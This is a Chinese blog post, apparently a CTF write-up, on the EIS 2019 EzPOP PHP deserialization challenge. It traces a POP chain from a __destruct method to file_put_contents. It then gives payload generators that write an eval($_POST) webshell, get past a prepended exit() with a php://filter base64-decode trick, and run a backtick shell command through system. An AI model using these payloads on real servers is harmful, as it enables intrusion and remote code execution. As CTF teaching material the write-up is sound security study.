@@ -1,0 +1,725 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>[EIS 2019]EzPOP延展做法 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="[EIS 2019]EzPOP延展做法">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-06 17:11" pubdate>
+        2020年5月6日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[EIS 2019]EzPOP延展做法</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>给了源码，审计开始 go！go！go！</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;
+
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;
+
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;
+
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;
+        <span class="hljs-keyword">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;
+        <span class="hljs-keyword">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;
+        <span class="hljs-variable">$cachedProperties</span> = array_flip([
+            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,
+            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,
+        ]);
+
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;
+            <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$object</span>)) &#123;
+                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = array_intersect_key(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);
+            &#125;
+        &#125;
+
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-variable">$cleaned</span> = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);
+
+        <span class="hljs-keyword">return</span> json_encode([<span class="hljs-variable">$cleaned</span>, <span class="hljs-keyword">$this</span>-&gt;complete]);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();
+
+        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;
+            <span class="hljs-keyword">$this</span>-&gt;save();
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;
+
+    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;
+        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;
+    &#125;
+
+    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;
+        <span class="hljs-keyword">if</span> (is_numeric(<span class="hljs-variable">$data</span>)) &#123;
+            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;
+        &#125;
+
+        <span class="hljs-variable">$serialize</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];
+
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;
+
+        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$expire</span>)) &#123;
+            <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];
+        &#125;
+
+        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;getExpireTime(<span class="hljs-variable">$expire</span>);
+        <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);
+
+        <span class="hljs-variable">$dir</span> = dirname(<span class="hljs-variable">$filename</span>);
+
+        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>)) &#123;
+            <span class="hljs-keyword">try</span> &#123;
+                mkdir(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);
+            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;
+                <span class="hljs-comment">// 创建失败</span>
+            &#125;
+        &#125;
+
+        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;
+            <span class="hljs-comment">//数据压缩</span>
+            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);
+        &#125;
+
+        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;
+        <span class="hljs-variable">$result</span> = file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        &#125;
+
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    &#125;
+
+&#125;
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))
+&#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;
+
+<span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;
+
+<span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>))
+&#123;
+    mkdir(<span class="hljs-variable">$dir</span>);
+&#125;
+unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);
+</code></pre>
+
+<p>​        我这个最菜web🐕做代码审计题通常都是先整体看看代码的大意逻辑，然后再具体看代码的实现过程。在这里先不看两个A、B类，接下来看便是传入src可以看代码，建一个upload文件夹，还有一个<code>unserialize($_GET[&quot;data&quot;]);</code>,data是我们传入的，可控，基本上就确定是利用反序列化，通过data传入构造的payload。</p>
+<p>​        审计A类有魔术方法<code>__destruct</code>,B类没有魔术方法，但B类里面有<code>file_put_contents</code>可以写文件，这明摆着就可以写webshell了，👴二话不说开始🤔。从<code>__destruct</code>开始搞，咱建一个A类，就叫<code>$a</code>吧，<code>$a</code>走的时候触发<code>__destruct</code></p>
+<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;
+            <span class="hljs-keyword">$this</span>-&gt;save();
+        &#125;
+    &#125;</code></pre>
+
+<p><code>$this-&gt;autosave=false</code>就可以触发<code>save()</code></p>
+<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();
+
+        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);
+&#125;</code></pre>
+
+<p>save里面的<code>$this-&gt;store</code>调用了set,A里面没得set，真巧B里面有set</p>
+<p><code>$this-&gt;store</code>设置为B类，完事，咱跟进B类里面的set</p>
+<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;
+
+        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$expire</span>)) &#123;
+            <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];
+        &#125;
+
+        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;getExpireTime(<span class="hljs-variable">$expire</span>);
+        <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);
+
+        <span class="hljs-variable">$dir</span> = dirname(<span class="hljs-variable">$filename</span>);
+
+        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>)) &#123;
+            <span class="hljs-keyword">try</span> &#123;
+                mkdir(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);
+            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;
+                <span class="hljs-comment">// 创建失败</span>
+            &#125;
+        &#125;
+
+        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;
+            <span class="hljs-comment">//数据压缩</span>
+            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);
+        &#125;
+
+        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;
+        <span class="hljs-variable">$result</span> = file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        &#125;
+
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+&#125;</code></pre>
+
+<p>太乱了，👴看不下去了，来倒着推吧，咱利用<code>$result = file_put_contents($filename, $data);</code>写shell。</p>
+<p>先看<code>$filename</code></p>
+<pre><code class="hljs php"><span class="hljs-variable">$name</span> 是咱在save中传过来的也就是 <span class="hljs-keyword">$this</span>-&gt;key
+
+<span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;
+&#125;
+
+options数组是B的，可控，<span class="hljs-variable">$name</span>是a中传的key，可控，完事文件名可控
+总结: 文件名是 <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$key</span></code></pre>
+
+<p>再看<code>$data</code></p>
+<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;
+            <span class="hljs-comment">//数据压缩</span>
+            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);
+        &#125;
+<span class="hljs-comment">#gzcompress根本不存在忽略了，如果不放心可以吧options[&#x27;data_compress&#x27;]=falase</span>
+
+<span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);
+serialize是什么鬼，序列化吗不对劲啊，👴看看
+仔细看定义了个serialize函数，最后实现的是<span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);  <span class="hljs-variable">$serialize</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];  这个函数可控啊，先记下来打个🌟
+    
+<span class="hljs-variable">$value</span>就是A中传的 <span class="hljs-variable">$contents</span>
+<span class="hljs-variable">$contents</span>又是什么🌶🐓，哦，原来是json_encode([<span class="hljs-variable">$cleaned</span>, <span class="hljs-keyword">$this</span>-&gt;complete]);<span class="hljs-variable">$cleaned</span>设置成空，就是 <span class="hljs-keyword">$this</span>-&gt;complete 了。
+总结 <span class="hljs-variable">$data</span> 就是  <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;complete;</code></pre>
+
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>构造完事，根据上面的分析过有</p>
+<pre><code class="hljs php">A：
+<span class="hljs-variable">$store</span> 指向B
+<span class="hljs-variable">$key</span>   文件后缀名  指定就 .php
+<span class="hljs-variable">$expire</span> 没啥用
+<span class="hljs-keyword">$this</span>-&gt;autosave <span class="hljs-literal">false</span>
+<span class="hljs-keyword">$this</span>-&gt;cache 设为空
+<span class="hljs-keyword">$this</span>-&gt;complete  🐎
+
+B:
+options[<span class="hljs-string">&#x27;prefix&#x27;</span>]  文件名
+options[<span class="hljs-string">&#x27;serialize&#x27;</span>] 方法
+options[<span class="hljs-string">&#x27;expire&#x27;</span>] 没啥用
+options[<span class="hljs-string">&#x27;data_compress&#x27;</span>]  <span class="hljs-literal">false</span>
+</code></pre>
+
+<p>构造</p>
+<pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();
+<span class="hljs-variable">$b</span>-&gt;writeTimes = <span class="hljs-number">0</span>;
+<span class="hljs-variable">$b</span> -&gt; options = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;serialize&#x27;</span> =&gt; <span class="hljs-string">&quot;strtoupper&quot;</span>, 
+                      <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,
+                      <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&quot;shell&quot;</span>);
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$store</span> = <span class="hljs-variable">$b</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;.php&quot;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-number">0</span>);
+<span class="hljs-variable">$a</span>-&gt;autosave = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$a</span>-&gt;cache = <span class="hljs-keyword">array</span>();
+<span class="hljs-variable">$a</span>-&gt;complete = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;&#x27;</span>;
+
+<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre>
+
+<p>你会发现执行不了，这是为什么呢因为 <code>$data</code>前面拼接了<code>exit()</code>,根本就执行不了。</p>
+<p><img src="https://s1.ax1x.com/2020/05/06/YEDhKH.png" srcset="/img/loading.gif" alt="YEDhKH.png"></p>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>绕死亡<code>exit()</code>,可以通过伪协议绕过</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();
+<span class="hljs-variable">$b</span>-&gt;writeTimes = <span class="hljs-number">0</span>;
+<span class="hljs-variable">$b</span> -&gt; options = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;serialize&#x27;</span> =&gt; <span class="hljs-string">&quot;trim&quot;</span>,
+    <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,
+    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=uploads/b&quot;</span>);
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$store</span> = <span class="hljs-variable">$b</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;.php&quot;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-number">0</span>);
+<span class="hljs-variable">$a</span>-&gt;autosave = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$a</span>-&gt;cache = <span class="hljs-keyword">array</span>();
+<span class="hljs-variable">$a</span>-&gt;complete = <span class="hljs-string">&#x27;aaa&#x27;</span>.base64_encode(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;b&quot;]);?&gt;&#x27;</span>);
+<span class="hljs-comment"># 这里拼接了aaa 是为了base64能正常解码</span>
+<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre>
+
+<p>🐎就上传到uploads/b.php了密码是b</p>
+<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>其他解法</p>
+<pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();
+<span class="hljs-variable">$b</span>-&gt;writeTimes = <span class="hljs-number">0</span>;
+<span class="hljs-variable">$b</span> -&gt; options = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;serialize&#x27;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>,
+    <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,
+    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&quot;b&quot;</span>);
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$store</span> = <span class="hljs-variable">$b</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;.php&quot;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-number">0</span>);
+<span class="hljs-variable">$a</span>-&gt;autosave = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$a</span>-&gt;cache = <span class="hljs-keyword">array</span>();
+<span class="hljs-variable">$a</span>-&gt;complete = <span class="hljs-string">&#x27;`cat /flag &gt; ./flag.php`&#x27;</span>;
+
+<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre>
+
+<p>相当于</p>
+<pre><code class="hljs php">system(<span class="hljs-string">&#x27;[[],&quot;`cat /flag &gt; ./flag.php`&quot;]&#x27;</span>)</code></pre>
+
+<p>在shell里执行的时候 反引号 的优先级是高于引号的，所以会先执行<code>cat /flag &gt; ./flag.php</code>，flag就被写到flag.php里面去了</p>
+<p><img src="https://s1.ax1x.com/2020/05/06/YERz59.png" srcset="/img/loading.gif" alt="YERz59.png"></p>
+<p>如图虽然命令错误，但是任然正常执行了反引号里的命令</p>
+<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p>总结： 入门半年的web🐕觉得代码审计真的是太太太难了，当审不下去的时候可以倒过来从可能的利用点思考。还有要多多看大师傅的文章，发现更多的骚操作！！！</p>
+<p><strong>参考</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6397.html">https://www.zhaoj.in/read-6397.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194036">https://www.anquanke.com/post/id/194036</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.rayi.vip/2019/11/27/EIS%202019/">http://www.rayi.vip/2019/11/27/EIS%202019/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                  </div>
+                
+              </div>
+              
